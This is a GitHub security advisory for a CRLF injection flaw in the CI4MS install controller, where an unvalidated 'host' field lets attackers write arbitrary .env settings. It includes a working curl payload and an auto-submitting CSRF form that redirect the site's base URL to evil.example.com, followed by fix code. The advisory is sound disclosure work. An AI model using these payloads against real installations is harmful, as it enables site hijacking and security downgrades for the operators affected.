# [H] CI4MS Vulnerable to .env CRLF Injection via Unvalidated `host` Parameter in Install Controller

## Summary
Severity: High
Advisory: GHSA-vfhx-5459-qhqh
CVE: CVE-2026-39394
CWE: CWE-93
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-04-08
Source: https://github.com/advisories/GHSA-vfhx-5459-qhqh
Type: github-advisory

## Affected
- Packagist: `ci4-cms-erp/ci4ms` — affected >=0 <0.31.4.0

## Details
## Summary

The `Install::index()` controller reads the `host` POST parameter without any validation and passes it directly into `updateEnvSettings()`, which writes it into the `.env` file via `preg_replace()`. Because newline characters in the value are not stripped, an attacker can inject arbitrary configuration directives into the `.env` file. The install routes have CSRF protection explicitly disabled, and the `InstallFilter` can be bypassed when `cache('settings')` is empty (cache expiry or fresh deployment).

## Details

In `modules/Install/Controllers/Install.php`, the `$valData` array (lines 13-27) defines validation rules for all POST parameters **except** `host`. The `host` value is read at line 35:

```php
// line 32-41
$updates = [
    'CI_ENVIRONMENT' => 'development',
    'app.baseURL' => '\'' . $this->request->getPost('baseUrl') . '\'',
    'database.default.hostname' => $this->request->getPost('host'),  // NO VALIDATION
    'database.default.database' => $this->request->getPost('dbname'),
    // ...
];
```

This value is passed to `updateEnvSettings()` (lines 89-101), which uses `preg_replace` with the raw value as the replacement string:

```php
// line 94-98
foreach ($updates as $key => $value) {
    $pattern = '/^' . preg_quote($key, '/') . '=.*/m';
    $replacement = "{$key}={$value}";
    if (preg_match($pattern, $contents)) $contents = preg_replace($pattern, $replacement, $contents);
    else $contents .= PHP_EOL . $replacement;
}
```

Since the `env` template has all lines commented out (e.g., `# database.default.hostname = localhost`), the pattern does not match, and the value is appended verbatim — including any embedded newline characters. This allows injection of arbitrary key=value pairs into `.env`.

The `dbpassword` field (line 17) is a secondary vector — its validation (`permit_empty|max_length[255]`) does not reject newline characters.

**Access conditions:**
- CSRF is explicitly disabled for install routes (`InstallConfig.php:7-9`), confirmed consumed by `Filters.php:220-231,246-251`.
- `InstallFilter` (line 13) only blocks when **both** `.env` exists **and** `cache('settings')` is populated. The endpoint is accessible during fresh install or after cache expiry/clear.

**Mitigation note:** `encryption.key` injection is NOT exploitable because `generateEncryptionKey()` (line 70) runs after `updateEnvSettings()` and overwrites all `encryption.key=` lines with a cryptographically random value. However, all other `.env` settings remain injectable.

## PoC

**Scenario:** Application is deployed but cache has expired (or fresh install window).

```bash
# Inject app.baseURL override and disable secure requests via host parameter
# The %0a represents a newline that creates new .env lines
curl -X POST 'http://target/install/' \
  -d 'baseUrl=http://target/&dbname=ci4ms&dbusername=root&dbpassword=&dbdriver=MySQLi&dbpre=ci4ms_&dbport=3306&name=Admin&surname=User&username=admin&password=Password123&email=admin@example.com&siteName=TestSite&host=localhost%0aapp.baseURL=http://evil.example.com/%0aapp.forceGlobalSecureRequests=false%0asession.driver=CodeIgniter\Session\Handlers\DatabaseHandler'
```

**Expected result:** The `.env` file will contain:

```
database.default.hostname=localhost
app.baseURL=http://evil.example.com/
app.forceGlobalSecureRequests=false
session.driver=CodeIgniter\Session\Handlers\DatabaseHandler
```

These injected lines override the legitimate `app.baseURL` set earlier (CI4's DotEnv processes top-to-bottom; later values win for `putenv`), redirect the application base URL to an attacker-controlled domain, and modify session handling.

**CSRF exploitation variant** (no direct access needed):

```html
<!-- Hosted on attacker site, victim admin visits while cache is empty -->
<form id="f" method="POST" action="http://target/install/">
  <input name="baseUrl" value="http://target/">
  <input name="host" value="localhost&#10;app.baseURL='http://evil.example.com/'">
  <!-- ... other required fields ... -->
</form>
<script>document.getElementById('f').submit();</script>
```

## Impact

An unauthenticated attacker can inject arbitrary configuration into the `.env` file when the install endpoint is accessible (fresh deployment or cache expiry). This enables:

- **Application URL hijacking** — injecting `app.baseURL` to an attacker domain, causing password reset links, redirects, and asset loading to point to attacker infrastructure
- **Security downgrade** — disabling `forceGlobalSecureRequests`, CSP, or other security settings
- **Session manipulation** — changing session driver or save path configuration
- **Full application reconfiguration** — the `copyEnvFile()` method overwrites the existing `.env` with the template before applying updates, destroying the current configuration (denial of service)
- **Database redirect** — while not via the `host` injection itself (the host value is a legitimate DB config), injecting additional database config lines can alter connection behavior

The attack is amplified by the absence of CSRF protection on the install endpoint, allowing exploitation via a malicious webpage visited by anyone on the same network.

## Recommended Fix

1. **Add validation for the `host` parameter** — reject newlines and restrict to valid hostnames/IPs:

```php
// In $valData, add:
'host' => ['label' => lang('Install.databaseHost'), 'rules' => 'required|max_length[255]|regex_match[/^[a-zA-Z0-9._-]+$/]'],
```

2. **Sanitize all values in `updateEnvSettings()`** — strip newlines from replacement strings:

```php
private function updateEnvSettings(array $updates)
{
    $envPath = ROOTPATH . '.env';
    if (!file_exists($envPath)) return ['error' => "'.env' file not found."];
    $contents = file_get_contents($envPath);
    foreach ($updates as $key => $value) {
        $value = str_replace(["\r", "\n"], '', (string) $value);  // Strip CRLF
        $pattern = '/^' . preg_quote($key, '/') . '=.*/m';
        $replacement = "{$key}={$value}";
        if (preg_match($pattern, $contents)) $contents = preg_replace($pattern, $replacement, $contents);
        else $contents .= PHP_EOL . $replacement;
    }
    file_put_contents($envPath, $contents);
    return true;
}
```

3. **Add newline validation to `dbpassword`** — add `regex_match[/^[^\r\n]*$/]` to the validation rules.

4. **Strengthen `InstallFilter`** — consider checking for a more reliable installation-complete indicator than cache state (e.g., a database table existence check or a dedicated lock file).

## References
- https://github.com/ci4-cms-erp/ci4ms/security/advisories/GHSA-vfhx-5459-qhqh
- https://nvd.nist.gov/vuln/detail/CVE-2026-39394
- https://github.com/ci4-cms-erp/ci4ms
- https://github.com/ci4-cms-erp/ci4ms/releases/tag/0.31.4.0
